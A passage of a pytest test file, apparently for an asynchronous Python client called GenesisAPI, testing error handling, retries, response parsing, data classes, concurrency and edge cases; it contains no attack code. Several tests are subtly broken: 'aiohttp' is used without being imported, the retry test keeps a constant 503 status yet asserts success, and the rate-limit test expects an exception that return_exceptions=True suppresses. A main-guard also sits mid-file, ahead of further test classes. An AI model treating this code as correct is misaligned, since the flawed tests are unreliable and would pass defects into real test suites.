import pytest
import json
import asyncio
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from datetime import datetime, timezone
import uuid
import logging

# Import the module under test
from app.ai_backend.genesis_api import (
    GenesisAPI,
    GenesisAPIError,
    GenesisAPITimeoutError,
    GenesisAPIAuthenticationError,
    GenesisAPIRateLimitError,
    GenesisAPIServerError,
    GenesisRequest,
    GenesisResponse,
    validate_api_key,
    format_genesis_prompt,
    parse_genesis_response,
    handle_genesis_error,
    retry_with_exponential_backoff
)


class TestGenesisAPI:
    """Test class for GenesisAPI functionality."""

    def setup_method(self):
        """
        Initializes a GenesisAPI instance with test credentials before each test.
        """
        self.api_key = "test_api_key_123"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    def teardown_method(self):
        """
        Performs cleanup after each test method execution.
        """
        # Clean up any resources
        pass

    def test_genesis_api_initialization(self):
        """Test GenesisAPI initialization with valid parameters."""
        api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        assert api.api_key == self.api_key
        assert api.base_url == self.base_url
        assert api.timeout == 30  # default timeout
        assert api.max_retries == 3  # default max retries

    def test_genesis_api_initialization_with_custom_params(self):
        """Test GenesisAPI initialization with custom parameters."""
        api = GenesisAPI(
            api_key=self.api_key,
            base_url=self.base_url,
            timeout=60,
            max_retries=5
        )
        assert api.timeout == 60
        assert api.max_retries == 5

    def test_genesis_api_initialization_invalid_api_key(self):
        """Test GenesisAPI initialization with invalid API key."""
        with pytest.raises(GenesisAPIAuthenticationError):
            GenesisAPI(api_key="", base_url=self.base_url)

    def test_genesis_api_initialization_invalid_base_url(self):
        """Test GenesisAPI initialization with invalid base URL."""
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url="")

    @pytest.mark.asyncio
    async def test_generate_text_success(self):
        """
        Test that the generate_text method returns a valid GenesisResponse object on successful API call.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Test prompt")
            
            assert result.text == "Generated text response"
            assert result.model == "genesis-v1"
            assert result.usage["prompt_tokens"] == 10

    @pytest.mark.asyncio
    async def test_generate_text_with_parameters(self):
        """
        Test that text generation with custom parameters returns the expected response and sends the correct request payload.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v2",
            "created": 1234567890,
            "usage": {"prompt_tokens": 15, "completion_tokens": 25}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text(
                prompt="Test prompt",
                model="genesis-v2",
                max_tokens=100,
                temperature=0.8
            )
            
            # Verify the request was made with correct parameters
            mock_post.assert_called_once()
            call_args = mock_post.call_args
            assert call_args[1]['json']['model'] == "genesis-v2"
            assert call_args[1]['json']['max_tokens'] == 100
            assert call_args[1]['json']['temperature'] == 0.8

    @pytest.mark.asyncio
    async def test_generate_text_authentication_error(self):
        """
        Test that an authentication error (HTTP 401) during text generation raises GenesisAPIAuthenticationError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 401
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Invalid API key"}
            )
            
            with pytest.raises(GenesisAPIAuthenticationError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_rate_limit_error(self):
        """
        Test that the generate_text method raises GenesisAPIRateLimitError when the API returns a 429 rate limit error.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Rate limit exceeded"}
            )
            
            with pytest.raises(GenesisAPIRateLimitError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_server_error(self):
        """
        Test that a server error (HTTP 500) during text generation raises a GenesisAPIServerError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Internal server error"}
            )
            
            with pytest.raises(GenesisAPIServerError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_timeout_error(self):
        """
        Test that a timeout during text generation raises a GenesisAPITimeoutError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.side_effect = asyncio.TimeoutError()
            
            with pytest.raises(GenesisAPITimeoutError):
                await self.genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_generate_text_empty_prompt(self):
        """
        Test that generating text with an empty prompt raises a ValueError.
        """
        with pytest.raises(ValueError):
            await self.genesis_api.generate_text("")

    @pytest.mark.asyncio
    async def test_generate_text_none_prompt(self):
        """
        Test that passing None as the prompt to generate_text raises a ValueError.
        """
        with pytest.raises(ValueError):
            await self.genesis_api.generate_text(None)

    @pytest.mark.asyncio
    async def test_generate_text_very_long_prompt(self):
        """
        Test that the API raises a GenesisAPIError when attempting to generate text with a very long prompt.
        """
        long_prompt = "A" * 10000
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 400
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Prompt too long"}
            )
            
            with pytest.raises(GenesisAPIError):
                await self.genesis_api.generate_text(long_prompt)

    @pytest.mark.asyncio
    async def test_generate_text_with_retry_logic(self):
        """
        Tests that the `generate_text` method retries on transient failures (e.g., HTTP 503) and succeeds after a retry.
        
        Simulates an initial 503 error followed by a successful response, verifying that the retry logic results in a successful text generation.
        """
        mock_response = {
            "id": "test_id_123",
            "text": "Generated text response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # First call fails with 503, second succeeds
            mock_post.return_value.__aenter__.return_value.status = 503
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=[
                    {"error": "Service temporarily unavailable"},
                    mock_response
                ]
            )
            
            # Mock the retry logic
            with patch('asyncio.sleep'):
                # Should succeed after retry
                result = await self.genesis_api.generate_text("Test prompt")
                assert result.text == "Generated text response"

    def test_validate_api_key_valid(self):
        """
        Test that `validate_api_key` returns True for a valid API key.
        """
        valid_key = "sk-1234567890abcdef"
        assert validate_api_key(valid_key) == True

    def test_validate_api_key_invalid(self):
        """
        Test that `validate_api_key` returns False for various invalid API key formats.
        """
        invalid_keys = [
            "",
            None,
            "short",
            "invalid_format",
            "sk-",
            "sk-123"
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) == False

    def test_format_genesis_prompt_basic(self):
        """
        Tests that the `format_genesis_prompt` function correctly formats a basic prompt and includes required fields in the output dictionary.
        """
        prompt = "Hello world"
        formatted = format_genesis_prompt(prompt)
        assert isinstance(formatted, dict)
        assert formatted["prompt"] == prompt
        assert "model" in formatted
        assert "max_tokens" in formatted

    def test_format_genesis_prompt_with_parameters(self):
        """
        Test that `format_genesis_prompt` correctly formats a prompt with specified model, max_tokens, and temperature parameters.
        """
        prompt = "Test prompt"
        formatted = format_genesis_prompt(
            prompt=prompt,
            model="genesis-v2",
            max_tokens=500,
            temperature=0.9
        )
        
        assert formatted["prompt"] == prompt
        assert formatted["model"] == "genesis-v2"
        assert formatted["max_tokens"] == 500
        assert formatted["temperature"] == 0.9

    def test_format_genesis_prompt_invalid_temperature(self):
        """
        Test that `format_genesis_prompt` raises a ValueError when called with an invalid temperature value.
        """
        with pytest.raises(ValueError):
            format_genesis_prompt("Test", temperature=1.5)

    def test_format_genesis_prompt_invalid_max_tokens(self):
        """
        Test that `format_genesis_prompt` raises a ValueError when called with an invalid `max_tokens` value.
        """
        with pytest.raises(ValueError):
            format_genesis_prompt("Test", max_tokens=-1)

    def test_parse_genesis_response_valid(self):
        """
        Test that a valid Genesis API response dictionary is correctly parsed into a GenesisResponse object.
        """
        response_data = {
            "id": "test_id_123",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        result = parse_genesis_response(response_data)
        assert isinstance(result, GenesisResponse)
        assert result.id == "test_id_123"
        assert result.text == "Generated text"
        assert result.model == "genesis-v1"
        assert result.created == 1234567890
        assert result.usage["prompt_tokens"] == 10

    def test_parse_genesis_response_missing_required_fields(self):
        """
        Test that `parse_genesis_response` raises `GenesisAPIError` when required fields are missing from the response.
        """
        invalid_responses = [
            {},
            {"id": "test"},
            {"text": "test"},
            {"id": "test", "text": "test"}  # missing model
        ]
        
        for response in invalid_responses:
            with pytest.raises(GenesisAPIError):
                parse_genesis_response(response)

    def test_parse_genesis_response_invalid_usage_format(self):
        """
        Test that parsing a response with an invalid usage field format raises a GenesisAPIError.
        """
        response_data = {
            "id": "test_id_123",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": "invalid_usage_format"
        }
        
        with pytest.raises(GenesisAPIError):
            parse_genesis_response(response_data)

    def test_handle_genesis_error_401(self):
        """
        Test that a 401 status code triggers a GenesisAPIAuthenticationError when handled by handle_genesis_error.
        """
        with pytest.raises(GenesisAPIAuthenticationError):
            handle_genesis_error(401, {"error": "Unauthorized"})

    def test_handle_genesis_error_429(self):
        """
        Test that a 429 status code triggers a GenesisAPIRateLimitError when handled by handle_genesis_error.
        """
        with pytest.raises(GenesisAPIRateLimitError):
            handle_genesis_error(429, {"error": "Rate limit exceeded"})

    def test_handle_genesis_error_500(self):
        """
        Test that a 500 status code triggers a GenesisAPIServerError when handled by handle_genesis_error.
        """
        with pytest.raises(GenesisAPIServerError):
            handle_genesis_error(500, {"error": "Internal server error"})

    def test_handle_genesis_error_generic(self):
        """
        Test that handle_genesis_error raises GenesisAPIError for generic error status codes.
        """
        with pytest.raises(GenesisAPIError):
            handle_genesis_error(400, {"error": "Bad request"})

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_success(self):
        """
        Test that `retry_with_exponential_backoff` retries a failing asynchronous function and succeeds when a retryable error is followed by a successful result.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = [
            GenesisAPIServerError("Server error"),
            "Success"
        ]
        
        with patch('asyncio.sleep'):
            result = await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert result == "Success"
            assert mock_func.call_count == 2

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_max_retries(self):
        """
        Test that `retry_with_exponential_backoff` stops retrying after reaching the maximum number of retries and raises the last encountered exception.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = GenesisAPIServerError("Server error")
        
        with patch('asyncio.sleep'):
            with pytest.raises(GenesisAPIServerError):
                await retry_with_exponential_backoff(mock_func, max_retries=2)
            assert mock_func.call_count == 2

    @pytest.mark.asyncio
    async def test_retry_with_exponential_backoff_non_retryable_error(self):
        """
        Test that `retry_with_exponential_backoff` does not retry when a non-retryable error is raised.
        
        Verifies that the function immediately raises a `GenesisAPIAuthenticationError` without retrying, and the wrapped function is called only once.
        """
        mock_func = AsyncMock()
        mock_func.side_effect = GenesisAPIAuthenticationError("Auth error")
        
        with pytest.raises(GenesisAPIAuthenticationError):
            await retry_with_exponential_backoff(mock_func, max_retries=2)
        assert mock_func.call_count == 1  # Should not retry auth errors


class TestGenesisRequest:
    """Test class for GenesisRequest data class."""

    def test_genesis_request_creation(self):
        """Test creating GenesisRequest instance."""
        request = GenesisRequest(
            prompt="Test prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        assert request.prompt == "Test prompt"
        assert request.model == "genesis-v1"
        assert request.max_tokens == 100
        assert request.temperature == 0.7

    def test_genesis_request_to_dict(self):
        """Test converting GenesisRequest to dictionary."""
        request = GenesisRequest(
            prompt="Test prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        result = request.to_dict()
        assert isinstance(result, dict)
        assert result["prompt"] == "Test prompt"
        assert result["model"] == "genesis-v1"
        assert result["max_tokens"] == 100
        assert result["temperature"] == 0.7

    def test_genesis_request_from_dict(self):
        """Test creating GenesisRequest from dictionary."""
        data = {
            "prompt": "Test prompt",
            "model": "genesis-v1",
            "max_tokens": 100,
            "temperature": 0.7
        }
        
        request = GenesisRequest.from_dict(data)
        assert request.prompt == "Test prompt"
        assert request.model == "genesis-v1"
        assert request.max_tokens == 100
        assert request.temperature == 0.7

    def test_genesis_request_validation(self):
        """Test GenesisRequest validation."""
        with pytest.raises(ValueError):
            GenesisRequest(prompt="", model="genesis-v1")
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model="", max_tokens=100)
        
        with pytest.raises(ValueError):
            GenesisRequest(prompt="Test", model="genesis-v1", max_tokens=-1)


class TestGenesisResponse:
    """Test class for GenesisResponse data class."""

    def test_genesis_response_creation(self):
        """
        Test that a GenesisResponse instance is created with the correct field values.
        """
        response = GenesisResponse(
            id="test_id",
            text="Generated text",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 10, "completion_tokens": 20}
        )
        
        assert response.id == "test_id"
        assert response.text == "Generated text"
        assert response.model == "genesis-v1"
        assert response.created == 1234567890
        assert response.usage["prompt_tokens"] == 10

    def test_genesis_response_to_dict(self):
        """
        Verify that the GenesisResponse object's to_dict method returns a dictionary with correct field values.
        """
        response = GenesisResponse(
            id="test_id",
            text="Generated text",
            model="genesis-v1",
            created=1234567890,
            usage={"prompt_tokens": 10, "completion_tokens": 20}
        )
        
        result = response.to_dict()
        assert isinstance(result, dict)
        assert result["id"] == "test_id"
        assert result["text"] == "Generated text"
        assert result["model"] == "genesis-v1"
        assert result["created"] == 1234567890
        assert result["usage"]["prompt_tokens"] == 10

    def test_genesis_response_from_dict(self):
        """
        Test that GenesisResponse can be correctly instantiated from a dictionary and its fields are properly set.
        """
        data = {
            "id": "test_id",
            "text": "Generated text",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        response = GenesisResponse.from_dict(data)
        assert response.id == "test_id"
        assert response.text == "Generated text"
        assert response.model == "genesis-v1"
        assert response.created == 1234567890
        assert response.usage["prompt_tokens"] == 10


class TestGenesisAPIExceptions:
    """Test class for Genesis API exception classes."""

    def test_genesis_api_error(self):
        """Test GenesisAPIError exception."""
        error = GenesisAPIError("Test error")
        assert str(error) == "Test error"
        assert isinstance(error, Exception)

    def test_genesis_api_authentication_error(self):
        """Test GenesisAPIAuthenticationError exception."""
        error = GenesisAPIAuthenticationError("Auth error")
        assert str(error) == "Auth error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_rate_limit_error(self):
        """Test GenesisAPIRateLimitError exception."""
        error = GenesisAPIRateLimitError("Rate limit error")
        assert str(error) == "Rate limit error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_server_error(self):
        """Test GenesisAPIServerError exception."""
        error = GenesisAPIServerError("Server error")
        assert str(error) == "Server error"
        assert isinstance(error, GenesisAPIError)

    def test_genesis_api_timeout_error(self):
        """Test GenesisAPITimeoutError exception."""
        error = GenesisAPITimeoutError("Timeout error")
        assert str(error) == "Timeout error"
        assert isinstance(error, GenesisAPIError)


class TestGenesisAPIIntegration:
    """Integration tests for Genesis API."""

    def setup_method(self):
        """
        Initializes test API key and base URL for integration tests.
        """
        self.api_key = "test_api_key_123"
        self.base_url = "https://api.genesis.example.com"

    @pytest.mark.asyncio
    async def test_end_to_end_text_generation(self):
        """
        Tests the complete text generation workflow using GenesisAPI, verifying that a valid response is returned and parsed correctly.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "test_id_123",
            "text": "This is a generated response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test the complete workflow
            result = await genesis_api.generate_text("Hello, world!")
            
            assert result.text == "This is a generated response"
            assert result.model == "genesis-v1"
            assert result.usage["prompt_tokens"] == 5
            assert result.usage["completion_tokens"] == 10

    @pytest.mark.asyncio
    async def test_concurrent_requests(self):
        """
        Test that the GenesisAPI can handle multiple concurrent text generation requests and returns correct responses for each.
        
        This test verifies that concurrent asynchronous calls to `generate_text` produce the expected results when the API is mocked to return a consistent response.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        mock_response = {
            "id": "test_id_123",
            "text": "Concurrent response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Create multiple concurrent requests
            tasks = [
                genesis_api.generate_text(f"Prompt {i}")
                for i in range(5)
            ]
            
            results = await asyncio.gather(*tasks)
            
            assert len(results) == 5
            for result in results:
                assert result.text == "Concurrent response"
                assert result.model == "genesis-v1"

    @pytest.mark.asyncio
    async def test_context_manager_usage(self):
        """
        Test that GenesisAPI can be used as an asynchronous context manager and generates text successfully within the context.
        """
        with patch('aiohttp.ClientSession') as mock_session:
            async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
                mock_response = {
                    "id": "test_id_123",
                    "text": "Context manager response",
                    "model": "genesis-v1",
                    "created": 1234567890,
                    "usage": {"prompt_tokens": 5, "completion_tokens": 10}
                }
                
                mock_session.return_value.post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_session.return_value.post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text("Test prompt")
                assert result.text == "Context manager response"


# Fixtures for common test data
@pytest.fixture
def sample_genesis_request():
    """
    Pytest fixture that returns a sample GenesisRequest instance for testing purposes.
    """
    return GenesisRequest(
        prompt="Test prompt",
        model="genesis-v1",
        max_tokens=100,
        temperature=0.7
    )


@pytest.fixture
def sample_genesis_response():
    """
    Fixture that returns a sample GenesisResponse object for use in tests.
    """
    return GenesisResponse(
        id="test_id_123",
        text="Generated text response",
        model="genesis-v1",
        created=1234567890,
        usage={"prompt_tokens": 10, "completion_tokens": 20}
    )


@pytest.fixture
def mock_genesis_api():
    """
    Fixture that returns a mocked GenesisAPI instance for testing purposes.
    """
    return GenesisAPI(api_key="test_api_key", base_url="https://api.genesis.example.com")


# Performance tests
class TestGenesisAPIPerformance:
    """Performance tests for Genesis API."""

    @pytest.mark.asyncio
    async def test_response_time_measurement(self):
        """
        Tests that the API call completes within an acceptable response time and returns the expected text in a mocked environment.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "test_id_123",
            "text": "Performance test response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            result = await genesis_api.generate_text("Performance test")
            end_time = datetime.now()
            
            response_time = (end_time - start_time).total_seconds()
            assert response_time < 1.0  # Should complete quickly in mock
            assert result.text == "Performance test response"

    @pytest.mark.asyncio
    async def test_large_batch_processing(self):
        """
        Test that the GenesisAPI can process a large batch of concurrent text generation requests and returns the expected responses for each prompt.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "test_id_123",
            "text": "Batch response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Process 50 requests in batch
            batch_size = 50
            prompts = [f"Batch prompt {i}" for i in range(batch_size)]
            
            tasks = [genesis_api.generate_text(prompt) for prompt in prompts]
            results = await asyncio.gather(*tasks)
            
            assert len(results) == batch_size
            for result in results:
                assert result.text == "Batch response"


# Edge case tests
class TestGenesisAPIEdgeCases:
    """Edge case tests for Genesis API."""

    @pytest.mark.asyncio
    async def test_unicode_prompt_handling(self):
        """
        Tests that the GenesisAPI correctly processes prompts containing Unicode characters and returns the expected response.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        unicode_prompt = "Hello 世界 🌍 émojis and spëcial chars"
        
        mock_response = {
            "id": "test_id_123",
            "text": "Unicode response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await genesis_api.generate_text(unicode_prompt)
            assert result.text == "Unicode response"

    @pytest.mark.asyncio
    async def test_malformed_json_response(self):
        """
        Test that a malformed JSON response from the API raises a GenesisAPIError during text generation.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=json.JSONDecodeError("Invalid JSON", "", 0)
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test prompt")

    @pytest.mark.asyncio
    async def test_network_connection_error(self):
        """
        Test that a network connection error during text generation raises a GenesisAPIError.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.side_effect = aiohttp.ClientConnectionError("Connection failed")
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test prompt")


if __name__ == "__main__":
    pytest.main([__file__])

# Additional comprehensive test scenarios
class TestGenesisAPIAdvancedScenarios:
    """Advanced test scenarios for comprehensive coverage."""
    
    def setup_method(self):
        """
        Initializes a GenesisAPI instance with test credentials for use in advanced scenario tests.
        """
        self.api_key = "test_api_key_advanced"
        self.base_url = "https://api.genesis.example.com"
        self.genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)

    @pytest.mark.asyncio
    async def test_generate_text_with_extreme_parameters(self):
        """
        Test that text generation works correctly when using extreme values for parameters such as max_tokens and temperature.
        
        Verifies that the API returns valid responses when called with maximum token limits, minimum temperature, and maximum temperature.
        """
        mock_response = {
            "id": "extreme_test_id",
            "text": "Extreme parameters response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 1, "completion_tokens": 4096}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Test with maximum tokens
            result = await self.genesis_api.generate_text(
                prompt="Test",
                max_tokens=4096,
                temperature=0.0
            )
            assert result.text == "Extreme parameters response"
            
            # Test with minimum temperature
            result = await self.genesis_api.generate_text(
                prompt="Test",
                temperature=0.0
            )
            assert result.text == "Extreme parameters response"
            
            # Test with maximum temperature
            result = await self.genesis_api.generate_text(
                prompt="Test",
                temperature=1.0
            )
            assert result.text == "Extreme parameters response"

    @pytest.mark.asyncio
    async def test_memory_efficient_large_response_handling(self):
        """
        Asynchronously tests that the API client can efficiently handle and process very large text responses without errors.
        
        This test mocks a 50KB API response and verifies that the generated text and token usage are correctly returned.
        """
        large_text = "A" * 50000  # 50KB response
        mock_response = {
            "id": "large_response_id",
            "text": large_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 50000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Generate large text")
            assert len(result.text) == 50000
            assert result.usage["completion_tokens"] == 50000

    @pytest.mark.asyncio
    async def test_api_key_security_validation(self):
        """
        Tests that the API key is securely handled and not exposed in the string representation of the GenesisAPI instance.
        """
        # Test that API key is not logged or exposed
        with patch('logging.getLogger') as mock_logger:
            api = GenesisAPI(api_key="secret_key_123", base_url=self.base_url)
            # Verify API key is stored securely and not exposed in string representation
            api_str = str(api)
            assert "secret_key_123" not in api_str
            
    def test_validate_api_key_comprehensive_formats(self):
        """
        Tests the `validate_api_key` function with a variety of valid and invalid API key formats to ensure comprehensive format validation.
        """
        # Valid formats
        valid_keys = [
            "sk-1234567890abcdef1234567890abcdef",
            "sk-ABCDEF1234567890abcdef1234567890",
            "sk-" + "a" * 48,  # 50 char total
        ]
        
        for key in valid_keys:
            assert validate_api_key(key) == True, f"Valid key {key} should pass validation"
            
        # Invalid formats - edge cases
        invalid_keys = [
            "sk-" + "a" * 5,    # Too short
            "sk-" + "a" * 100,  # Too long
            "sk-abc@def",       # Invalid characters
            "sk- " + "a" * 20,  # Space in key
            "sk-\n" + "a" * 20, # Newline in key
            "sk-\t" + "a" * 20, # Tab in key
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) == False, f"Invalid key {key} should fail validation"

    @pytest.mark.asyncio
    async def test_concurrent_rate_limiting_scenarios(self):
        """
        Tests that concurrent requests to the GenesisAPI correctly raise a GenesisAPIRateLimitError when the API responds with rate limiting status codes.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate rate limiting for first few requests, then success
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Rate limit exceeded", "retry_after": 1}
            )
            
            # Test multiple concurrent requests hitting rate limit
            tasks = [
                genesis_api.generate_text(f"Concurrent prompt {i}")
                for i in range(3)
            ]
            
            with pytest.raises(GenesisAPIRateLimitError):
                await asyncio.gather(*tasks, return_exceptions=True)

    @pytest.mark.asyncio
    async def test_request_id_tracking(self):
        """
        Verifies that the GenesisAPI correctly tracks and returns a UUID-formatted request ID in the response, ensuring correlation between requests and responses.
        """
        request_id = str(uuid.uuid4())
        mock_response = {
            "id": request_id,
            "text": "Tracked response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Track this request")
            assert result.id == request_id
            
            # Verify request ID is properly formatted UUID
            uuid.UUID(result.id)  # Should not raise exception

    @pytest.mark.asyncio
    async def test_response_streaming_simulation(self):
        """
        Tests that the GenesisAPI client correctly processes simulated streaming responses by handling chunked response text.
        """
        # Test chunked response processing
        mock_response = {
            "id": "stream_test_id",
            "text": "This is a streaming response that comes in chunks",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 8, "completion_tokens": 15}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await self.genesis_api.generate_text("Stream this response")
            assert "streaming response" in result.text

    @pytest.mark.asyncio
    async def test_connection_pool_management(self):
        """
        Tests that the GenesisAPI manages and cleans up its connection pool correctly when used as an asynchronous context manager.
        """
        # Test that connections are properly managed
        async with GenesisAPI(api_key=self.api_key, base_url=self.base_url) as api:
            mock_response = {
                "id": "pool_test_id",
                "text": "Connection pool response",
                "model": "genesis-v1",
                "created": 1234567890,
                "usage": {"prompt_tokens": 5, "completion_tokens": 10}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text("Test connection pool")
                assert result.text == "Connection pool response"

    def test_format_genesis_prompt_boundary_values(self):
        """
        Tests that `format_genesis_prompt` correctly formats prompts using minimum and maximum boundary values for `max_tokens` and `temperature`.
        """
        # Test minimum values
        formatted = format_genesis_prompt(
            prompt="A",
            max_tokens=1,
            temperature=0.0
        )
        assert formatted["prompt"] == "A"
        assert formatted["max_tokens"] == 1
        assert formatted["temperature"] == 0.0
        
        # Test maximum values
        formatted = format_genesis_prompt(
            prompt="Test prompt",
            max_tokens=4096,
            temperature=1.0
        )
        assert formatted["max_tokens"] == 4096
        assert formatted["temperature"] == 1.0

    def test_parse_genesis_response_with_optional_fields(self):
        """
        Test that `parse_genesis_response` correctly parses responses containing only required fields as well as those with additional optional or extra fields.
        
        Verifies that missing optional fields are handled with appropriate defaults and that extra metadata does not cause errors.
        """
        # Response with minimal required fields
        minimal_response = {
            "id": "minimal_id",
            "text": "Minimal response",
            "model": "genesis-v1"
        }
        
        result = parse_genesis_response(minimal_response)
        assert result.id == "minimal_id"
        assert result.text == "Minimal response"
